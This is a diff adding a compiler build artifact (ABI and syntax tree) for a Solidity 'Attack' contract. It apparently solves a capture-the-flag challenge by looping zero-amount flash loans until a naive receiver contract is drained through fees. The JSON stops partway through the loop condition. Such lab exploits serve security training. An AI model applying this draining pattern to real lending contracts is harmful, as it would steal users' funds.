@@ -1,0 +1,3860 @@
+{
+  "abi": [
+    {
+      "inputs": [],
+      "name": "execute",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "flash_loan_receiver",
+      "outputs": [
+        {
+          "internalType": "contract FlashLoanReceiver",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_flash",
+          "type": "address"
+        },
+        {
+          "internalType": "address",
+          "name": "_naive",
+          "type": "address"
+        }
+      ],
+      "name": "initialize",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "naive_receiver_lender_pool",
+      "outputs": [
+        {
+          "internalType": "contract NaiveReceiverLenderPool",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "viewFlashLoanBalance",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "viewNaiveReceiverLenderPoolBalance",
+      "outputs": [
+        {
+          "internalType": "uint256",
+          "name": "",
+          "type": "uint256"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "allSourcePaths": {
+    "1": "C:/Users/antho/.brownie/packages/OpenZeppelin/openzeppelin-contracts@4.6.0/contracts/utils/Address.sol",
+    "2": "contracts/Attack.sol",
+    "3": "contracts/FlashLoanReceiver.sol",
+    "4": "contracts/NaiveReceiverLenderPool.sol"
+  },
+  "ast": {
+    "absolutePath": "contracts/Attack.sol",
+    "exportedSymbols": {
+      "Address": [
+        541
+      ],
+      "Attack": [
+        95
+      ],
+      "FlashLoanReceiver": [
+        164
+      ],
+      "NaiveReceiverLenderPool": [
+        246
+      ],
+      "ReentrancyGuard": [
+        581
+      ]
+    },
+    "id": 96,
+    "license": "MIT",
+    "nodeType": "SourceUnit",
+    "nodes": [
+      {
+        "id": 1,
+        "literals": [
+          "solidity",
+          ">=",
+          "0.6",
+          ".0"
+        ],
+        "nodeType": "PragmaDirective",
+        "src": "32:24:2"
+      },
+      {
+        "absolutePath": "contracts/FlashLoanReceiver.sol",
+        "file": "./FlashLoanReceiver.sol",
+        "id": 2,
+        "nameLocation": "-1:-1:-1",
+        "nodeType": "ImportDirective",
+        "scope": 96,
+        "sourceUnit": 165,
+        "src": "57:33:2",
+        "symbolAliases": [],
+        "unitAlias": ""
+      },
+      {
+        "absolutePath": "contracts/NaiveReceiverLenderPool.sol",
+        "file": "./NaiveReceiverLenderPool.sol",
+        "id": 3,
+        "nameLocation": "-1:-1:-1",
+        "nodeType": "ImportDirective",
+        "scope": 96,
+        "sourceUnit": 247,
+        "src": "91:39:2",
+        "symbolAliases": [],
+        "unitAlias": ""
+      },
+      {
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "Attack",
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "fullyImplemented": true,
+        "id": 95,
+        "linearizedBaseContracts": [
+          95
+        ],
+        "name": "Attack",
+        "nameLocation": "220:6:2",
+        "nodeType": "ContractDefinition",
+        "nodes": [
+          {
+            "constant": false,
+            "functionSelector": "3f7837e1",
+            "id": 6,
+            "mutability": "mutable",
+            "name": "flash_loan_receiver",
+            "nameLocation": "258:19:2",
+            "nodeType": "VariableDeclaration",
+            "scope": 95,
+            "src": "233:44:2",
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+              "typeString": "contract FlashLoanReceiver"
+            },
+            "typeName": {
+              "id": 5,
+              "nodeType": "UserDefinedTypeName",
+              "pathNode": {
+                "id": 4,
+                "name": "FlashLoanReceiver",
+                "nodeType": "IdentifierPath",
+                "referencedDeclaration": 164,
+                "src": "233:17:2"
+              },
+              "referencedDeclaration": 164,
+              "src": "233:17:2",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+                "typeString": "contract FlashLoanReceiver"
+              }
+            },
+            "visibility": "public"
+          },
+          {
+            "constant": false,
+            "functionSelector": "8e26d8b3",
+            "id": 9,
+            "mutability": "mutable",
+            "name": "naive_receiver_lender_pool",
+            "nameLocation": "314:26:2",
+            "nodeType": "VariableDeclaration",
+            "scope": 95,
+            "src": "283:57:2",
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_NaiveReceiverLenderPool_$246",
+              "typeString": "contract NaiveReceiverLenderPool"
+            },
+            "typeName": {
+              "id": 8,
+              "nodeType": "UserDefinedTypeName",
+              "pathNode": {
+                "id": 7,
+                "name": "NaiveReceiverLenderPool",
+                "nodeType": "IdentifierPath",
+                "referencedDeclaration": 246,
+                "src": "283:23:2"
+              },
+              "referencedDeclaration": 246,
+              "src": "283:23:2",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_NaiveReceiverLenderPool_$246",
+                "typeString": "contract NaiveReceiverLenderPool"
+              }
+            },
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 34,
+              "nodeType": "Block",
+              "src": "410:152:2",
+              "statements": [
+                {
+                  "expression": {
+                    "id": 23,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 16,
+                      "name": "flash_loan_receiver",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 6,
+                      "src": "420:19:2",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+                        "typeString": "contract FlashLoanReceiver"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "arguments": [
+                        {
+                          "arguments": [
+                            {
+                              "id": 20,
+                              "name": "_flash",
+                              "nodeType": "Identifier",
+                              "overloadedDeclarations": [],
+                              "referencedDeclaration": 11,
+                              "src": "468:6:2",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_address",
+                                "typeString": "address"
+                              }
+                            }
+                          ],
+                          "expression": {
+                            "argumentTypes": [
+                              {
+                                "typeIdentifier": "t_address",
+                                "typeString": "address"
+                              }
+                            ],
+                            "id": 19,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": true,
+                            "lValueRequested": false,
+                            "nodeType": "ElementaryTypeNameExpression",
+                            "src": "460:8:2",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_type$_t_address_payable_$",
+                              "typeString": "type(address payable)"
+                            },
+                            "typeName": {
+                              "id": 18,
+                              "name": "address",
+                              "nodeType": "ElementaryTypeName",
+                              "src": "460:8:2",
+                              "stateMutability": "payable",
+                              "typeDescriptions": {}
+                            }
+                          },
+                          "id": 21,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "kind": "typeConversion",
+                          "lValueRequested": false,
+                          "names": [],
+                          "nodeType": "FunctionCall",
+                          "src": "460:15:2",
+                          "tryCall": false,
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address_payable",
+                            "typeString": "address payable"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_address_payable",
+                            "typeString": "address payable"
+                          }
+                        ],
+                        "id": 17,
+                        "name": "FlashLoanReceiver",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 164,
+                        "src": "442:17:2",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_contract$_FlashLoanReceiver_$164_$",
+                          "typeString": "type(contract FlashLoanReceiver)"
+                        }
+                      },
+                      "id": 22,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "442:34:2",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+                        "typeString": "contract FlashLoanReceiver"
+                      }
+                    },
+                    "src": "420:56:2",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+                      "typeString": "contract FlashLoanReceiver"
+                    }
+                  },
+                  "id": 24,
+                  "nodeType": "ExpressionStatement",
+                  "src": "420:56:2"
+                },
+                {
+                  "expression": {
+                    "id": 32,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 25,
+                      "name": "naive_receiver_lender_pool",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 9,
+                      "src": "486:26:2",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_NaiveReceiverLenderPool_$246",
+                        "typeString": "contract NaiveReceiverLenderPool"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "arguments": [
+                        {
+                          "arguments": [
+                            {
+                              "id": 29,
+                              "name": "_naive",
+                              "nodeType": "Identifier",
+                              "overloadedDeclarations": [],
+                              "referencedDeclaration": 13,
+                              "src": "547:6:2",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_address",
+                                "typeString": "address"
+                              }
+                            }
+                          ],
+                          "expression": {
+                            "argumentTypes": [
+                              {
+                                "typeIdentifier": "t_address",
+                                "typeString": "address"
+                              }
+                            ],
+                            "id": 28,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": true,
+                            "lValueRequested": false,
+                            "nodeType": "ElementaryTypeNameExpression",
+                            "src": "539:8:2",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_type$_t_address_payable_$",
+                              "typeString": "type(address payable)"
+                            },
+                            "typeName": {
+                              "id": 27,
+                              "name": "address",
+                              "nodeType": "ElementaryTypeName",
+                              "src": "539:8:2",
+                              "stateMutability": "payable",
+                              "typeDescriptions": {}
+                            }
+                          },
+                          "id": 30,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "kind": "typeConversion",
+                          "lValueRequested": false,
+                          "names": [],
+                          "nodeType": "FunctionCall",
+                          "src": "539:15:2",
+                          "tryCall": false,
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address_payable",
+                            "typeString": "address payable"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_address_payable",
+                            "typeString": "address payable"
+                          }
+                        ],
+                        "id": 26,
+                        "name": "NaiveReceiverLenderPool",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 246,
+                        "src": "515:23:2",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_contract$_NaiveReceiverLenderPool_$246_$",
+                          "typeString": "type(contract NaiveReceiverLenderPool)"
+                        }
+                      },
+                      "id": 31,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "515:40:2",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_NaiveReceiverLenderPool_$246",
+                        "typeString": "contract NaiveReceiverLenderPool"
+                      }
+                    },
+                    "src": "486:69:2",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_NaiveReceiverLenderPool_$246",
+                      "typeString": "contract NaiveReceiverLenderPool"
+                    }
+                  },
+                  "id": 33,
+                  "nodeType": "ExpressionStatement",
+                  "src": "486:69:2"
+                }
+              ]
+            },
+            "functionSelector": "485cc955",
+            "id": 35,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "initialize",
+            "nameLocation": "356:10:2",
+            "nodeType": "FunctionDefinition",
+            "parameters": {
+              "id": 14,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 11,
+                  "mutability": "mutable",
+                  "name": "_flash",
+                  "nameLocation": "375:6:2",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 35,
+                  "src": "367:14:2",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 10,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "367:7:2",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                },
+                {
+                  "constant": false,
+                  "id": 13,
+                  "mutability": "mutable",
+                  "name": "_naive",
+                  "nameLocation": "391:6:2",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 35,
+                  "src": "383:14:2",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 12,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "383:7:2",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "366:32:2"
+            },
+            "returnParameters": {
+              "id": 15,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "410:0:2"
+            },
+            "scope": 95,
+            "src": "347:215:2",
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 46,
+              "nodeType": "Block",
+              "src": "633:60:2",
+              "statements": [
+                {
+                  "expression": {
+                    "expression": {
+                      "arguments": [
+                        {
+                          "id": 42,
+                          "name": "flash_loan_receiver",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 6,
+                          "src": "658:19:2",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+                            "typeString": "contract FlashLoanReceiver"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+                            "typeString": "contract FlashLoanReceiver"
+                          }
+                        ],
+                        "id": 41,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "lValueRequested": false,
+                        "nodeType": "ElementaryTypeNameExpression",
+                        "src": "650:7:2",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_address_$",
+                          "typeString": "type(address)"
+                        },
+                        "typeName": {
+                          "id": 40,
+                          "name": "address",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "650:7:2",
+                          "typeDescriptions": {}
+                        }
+                      },
+                      "id": 43,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "650:28:2",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address",
+                        "typeString": "address"
+                      }
+                    },
+                    "id": 44,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "memberName": "balance",
+                    "nodeType": "MemberAccess",
+                    "src": "650:36:2",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "functionReturnParameters": 39,
+                  "id": 45,
+                  "nodeType": "Return",
+                  "src": "643:43:2"
+                }
+              ]
+            },
+            "functionSelector": "908ed935",
+            "id": 47,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "viewFlashLoanBalance",
+            "nameLocation": "577:20:2",
+            "nodeType": "FunctionDefinition",
+            "parameters": {
+              "id": 36,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "597:2:2"
+            },
+            "returnParameters": {
+              "id": 39,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 38,
+                  "mutability": "mutable",
+                  "name": "",
+                  "nameLocation": "-1:-1:-1",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 47,
+                  "src": "620:7:2",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_uint256",
+                    "typeString": "uint256"
+                  },
+                  "typeName": {
+                    "id": 37,
+                    "name": "uint256",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "620:7:2",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "619:9:2"
+            },
+            "scope": 95,
+            "src": "568:125:2",
+            "stateMutability": "view",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 58,
+              "nodeType": "Block",
+              "src": "778:67:2",
+              "statements": [
+                {
+                  "expression": {
+                    "expression": {
+                      "arguments": [
+                        {
+                          "id": 54,
+                          "name": "naive_receiver_lender_pool",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 9,
+                          "src": "803:26:2",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_contract$_NaiveReceiverLenderPool_$246",
+                            "typeString": "contract NaiveReceiverLenderPool"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_contract$_NaiveReceiverLenderPool_$246",
+                            "typeString": "contract NaiveReceiverLenderPool"
+                          }
+                        ],
+                        "id": 53,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "lValueRequested": false,
+                        "nodeType": "ElementaryTypeNameExpression",
+                        "src": "795:7:2",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_address_$",
+                          "typeString": "type(address)"
+                        },
+                        "typeName": {
+                          "id": 52,
+                          "name": "address",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "795:7:2",
+                          "typeDescriptions": {}
+                        }
+                      },
+                      "id": 55,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "795:35:2",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address",
+                        "typeString": "address"
+                      }
+                    },
+                    "id": 56,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "memberName": "balance",
+                    "nodeType": "MemberAccess",
+                    "src": "795:43:2",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "functionReturnParameters": 51,
+                  "id": 57,
+                  "nodeType": "Return",
+                  "src": "788:50:2"
+                }
+              ]
+            },
+            "functionSelector": "292bc63a",
+            "id": 59,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "viewNaiveReceiverLenderPoolBalance",
+            "nameLocation": "708:34:2",
+            "nodeType": "FunctionDefinition",
+            "parameters": {
+              "id": 48,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "742:2:2"
+            },
+            "returnParameters": {
+              "id": 51,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 50,
+                  "mutability": "mutable",
+                  "name": "",
+                  "nameLocation": "-1:-1:-1",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 59,
+                  "src": "765:7:2",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_uint256",
+                    "typeString": "uint256"
+                  },
+                  "typeName": {
+                    "id": 49,
+                    "name": "uint256",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "765:7:2",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "764:9:2"
+            },
+            "scope": 95,
+            "src": "699:146:2",
+            "stateMutability": "view",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 93,
+              "nodeType": "Block",
+              "src": "881:244:2",
+              "statements": [
+                {
+                  "assignments": [
+                    63
+                  ],
+                  "declarations": [
+                    {
+                      "constant": false,
+                      "id": 63,
+                      "mutability": "mutable",
+                      "name": "j",
+                      "nameLocation": "899:1:2",
+                      "nodeType": "VariableDeclaration",
+                      "scope": 93,
+                      "src": "891:9:2",
+                      "stateVariable": false,
+                      "storageLocation": "default",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_uint256",
+                        "typeString": "uint256"
+                      },
+                      "typeName": {
+                        "id": 62,
+                        "name": "uint256",
+                        "nodeType": "ElementaryTypeName",
+                        "src": "891:7:2",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_uint256",
+                          "typeString": "uint256"
+                        }
+                      },
+                      "visibility": "internal"
+                    }
+                  ],
+                  "id": 69,
+                  "initialValue": {
+                    "expression": {
+                      "arguments": [
+                        {
+                          "id": 66,
+                          "name": "flash_loan_receiver",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 6,
+                          "src": "911:19:2",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+                            "typeString": "contract FlashLoanReceiver"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+                            "typeString": "contract FlashLoanReceiver"
+                          }
+                        ],
+                        "id": 65,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "lValueRequested": false,
+                        "nodeType": "ElementaryTypeNameExpression",
+                        "src": "903:7:2",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_address_$",
+                          "typeString": "type(address)"
+                        },
+                        "typeName": {
+                          "id": 64,
+                          "name": "address",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "903:7:2",
+                          "typeDescriptions": {}
+                        }
+                      },
+                      "id": 67,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "903:28:2",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address",
+                        "typeString": "address"
+                      }
+                    },
+                    "id": 68,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "memberName": "balance",
+                    "nodeType": "MemberAccess",
+                    "src": "903:36:2",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "nodeType": "VariableDeclarationStatement",
+                  "src": "891:48:2"
+                },
+                {
+                  "body": {
+                    "id": 91,
+                    "nodeType": "Block",
+                    "src": "971:148:2",
+                    "statements": [
+                      {
+                        "expression": {
+                          "arguments": [
+                            {
+                              "arguments": [
+                                {
+                                  "id": 78,
+                                  "name": "flash_loan_receiver",
+                                  "nodeType": "Identifier",
+                                  "overloadedDeclarations": [],
+                                  "referencedDeclaration": 6,
+                                  "src": "1030:19:2",
+                                  "typeDescriptions": {
+                                    "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+                                    "typeString": "contract FlashLoanReceiver"
+                                  }
+                                }
+                              ],
+                              "expression": {
+                                "argumentTypes": [
+                                  {
+                                    "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+                                    "typeString": "contract FlashLoanReceiver"
+                                  }
+                                ],
+                                "id": 77,
+                                "isConstant": false,
+                                "isLValue": false,
+                                "isPure": true,
+                                "lValueRequested": false,
+                                "nodeType": "ElementaryTypeNameExpression",
+                                "src": "1022:7:2",
+                                "typeDescriptions": {
+                                  "typeIdentifier": "t_type$_t_address_$",
+                                  "typeString": "type(address)"
+                                },
+                                "typeName": {
+                                  "id": 76,
+                                  "name": "address",
+                                  "nodeType": "ElementaryTypeName",
+                                  "src": "1022:7:2",
+                                  "typeDescriptions": {}
+                                }
+                              },
+                              "id": 79,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "kind": "typeConversion",
+                              "lValueRequested": false,
+                              "names": [],
+                              "nodeType": "FunctionCall",
+                              "src": "1022:28:2",
+                              "tryCall": false,
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_address",
+                                "typeString": "address"
+                              }
+                            },
+                            {
+                              "hexValue": "30",
+                              "id": 80,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": true,
+                              "kind": "number",
+                              "lValueRequested": false,
+                              "nodeType": "Literal",
+                              "src": "1052:1:2",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_rational_0_by_1",
+                                "typeString": "int_const 0"
+                              },
+                              "value": "0"
+                            }
+                          ],
+                          "expression": {
+                            "argumentTypes": [
+                              {
+                                "typeIdentifier": "t_address",
+                                "typeString": "address"
+                              },
+                              {
+                                "typeIdentifier": "t_rational_0_by_1",
+                                "typeString": "int_const 0"
+                              }
+                            ],
+                            "expression": {
+                              "id": 73,
+                              "name": "naive_receiver_lender_pool",
+                              "nodeType": "Identifier",
+                              "overloadedDeclarations": [],
+                              "referencedDeclaration": 9,
+                              "src": "985:26:2",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_contract$_NaiveReceiverLenderPool_$246",
+                                "typeString": "contract NaiveReceiverLenderPool"
+                              }
+                            },
+                            "id": 75,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": false,
+                            "lValueRequested": false,
+                            "memberName": "flashLoan",
+                            "nodeType": "MemberAccess",
+                            "referencedDeclaration": 241,
+                            "src": "985:36:2",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$__$",
+                              "typeString": "function (address,uint256) external"
+                            }
+                          },
+                          "id": 81,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "kind": "functionCall",
+                          "lValueRequested": false,
+                          "names": [],
+                          "nodeType": "FunctionCall",
+                          "src": "985:69:2",
+                          "tryCall": false,
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_tuple$__$",
+                            "typeString": "tuple()"
+                          }
+                        },
+                        "id": 82,
+                        "nodeType": "ExpressionStatement",
+                        "src": "985:69:2"
+                      },
+                      {
+                        "expression": {
+                          "id": 89,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "leftHandSide": {
+                            "id": 83,
+                            "name": "j",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 63,
+                            "src": "1068:1:2",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_uint256",
+                              "typeString": "uint256"
+                            }
+                          },
+                          "nodeType": "Assignment",
+                          "operator": "=",
+                          "rightHandSide": {
+                            "expression": {
+                              "arguments": [
+                                {
+                                  "id": 86,
+                                  "name": "flash_loan_receiver",
+                                  "nodeType": "Identifier",
+                                  "overloadedDeclarations": [],
+                                  "referencedDeclaration": 6,
+                                  "src": "1080:19:2",
+                                  "typeDescriptions": {
+                                    "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+                                    "typeString": "contract FlashLoanReceiver"
+                                  }
+                                }
+                              ],
+                              "expression": {
+                                "argumentTypes": [
+                                  {
+                                    "typeIdentifier": "t_contract$_FlashLoanReceiver_$164",
+                                    "typeString": "contract FlashLoanReceiver"
+                                  }
+                                ],
+                                "id": 85,
+                                "isConstant": false,
+                                "isLValue": false,
+                                "isPure": true,
+                                "lValueRequested": false,
+                                "nodeType": "ElementaryTypeNameExpression",
+                                "src": "1072:7:2",
+                                "typeDescriptions": {
+                                  "typeIdentifier": "t_type$_t_address_$",
+                                  "typeString": "type(address)"
+                                },
+                                "typeName": {
+                                  "id": 84,
+                                  "name": "address",
+                                  "nodeType": "ElementaryTypeName",
+                                  "src": "1072:7:2",
+                                  "typeDescriptions": {}
+                                }
+                              },
+                              "id": 87,
+                              "isConstant": false,
+                              "isLValue": false,
+                              "isPure": false,
+                              "kind": "typeConversion",
+                              "lValueRequested": false,
+                              "names": [],
+                              "nodeType": "FunctionCall",
+                              "src": "1072:28:2",
+                              "tryCall": false,
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_address",
+                                "typeString": "address"
+                              }
+                            },
+                            "id": 88,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": false,
+                            "lValueRequested": false,
+                            "memberName": "balance",
+                            "nodeType": "MemberAccess",
+                            "src": "1072:36:2",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_uint256",
+                              "typeString": "uint256"
+                            }
+                          },
+                          "src": "1068:40:2",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_uint256",
+                            "typeString": "uint256"
+                          }
+                        },
+                        "id": 90,
+                        "nodeType": "ExpressionStatement",
+                        "src": "1068:40:2"
+                      }
+                    ]
+                  },
+                  "condition": {
+                    "commonType": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    },
+                    "id": 72,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftExpression": {
+                      "id": 70,
+                      "name": "j",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 63,
+                      "src": "956:1:2",
+                      "typeDescriptions": {
